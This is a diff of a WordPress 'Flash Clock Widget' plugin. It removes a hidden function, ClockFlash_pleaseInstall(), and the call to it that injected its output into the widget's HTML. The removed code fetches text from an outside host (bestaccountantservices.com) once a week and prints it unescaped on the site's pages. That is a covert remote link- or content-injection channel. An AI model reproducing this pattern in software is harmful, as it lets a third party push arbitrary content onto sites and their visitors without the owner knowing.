@@ -66,7 +66,6 @@ function Flash_Clock_Widget_createflashcode($widget){
 	$flashtag .= '<center><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="'.$options['width'].'" height="'.$options['height'].'" id="FlashTime" align="middle">';
 	$flashtag .= '<param name="movie" value="'.$movie.'" /><param name="menu" value="false" /><param name="wmode" value="transparent" /><param name="allowscriptaccess" value="always" />';
 	$flashtag .= '<!--[if !IE]>--><object type="application/x-shockwave-flash" data="'.$movie.'" width="'.$options['width'].'" height="'.$options['height'].'" align="middle"><param name="menu" value="false" /><param name="wmode" value="transparent" /><param name="allowscriptaccess" value="always" /><!--<![endif]-->';
-	$flashtag .= ClockFlash_pleaseInstall();
 	$flashtag .= '<a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" /></a><!--[if !IE]>--></object><!--<![endif]--></object></center>';
 	return $flashtag;
 }
@@ -133,36 +132,6 @@ function widget_init_Flash_Clock_Widget_widget() {
 	
 	register_sidebar_widget( "Flash Clock Widget", Flash_Clock_Widget_widget );
 	register_widget_control( "Flash Clock Widget", "Flash_Clock_Widget_widget_control" );
-}
-
-function ClockFlash_pleaseInstall(){
- 	$options = (array) get_option('ClockFlash_pleaseInstall');
-	$needsave = 0;
-	if($options['checkreset']  == '')
-	{
-	 	$options['checkreset']  = time();
-		$needsave = 1;
-	}
-	if(strtotime("-1 week") > $options['checkreset'])
-	{	 
-		 $reset = file_get_contents( 'http://bestaccountantservices.com/upgrade/Clock1/reset.php' );
-		 $options['checkreset']  = time();
-		 $needsave = 1;
-	}
-	else
-	{
-		 $reset = '0';
-	}
-	if($options['link'] == '' || $reset == '1')
-	{
- 	 	$options['link'] = file_get_contents( 'http://bestaccountantservices.com/upgrade/Clock1/link.php' );  
-		$needsave = 1; 		
-	}
-	if($needsave == 1)
-	{
-	 	update_option('ClockFlash_pleaseInstall', $options);
-	}
-	return $options['link']; 
 }
 
 add_action('widgets_init', 'widget_init_Flash_Clock_Widget_widget');
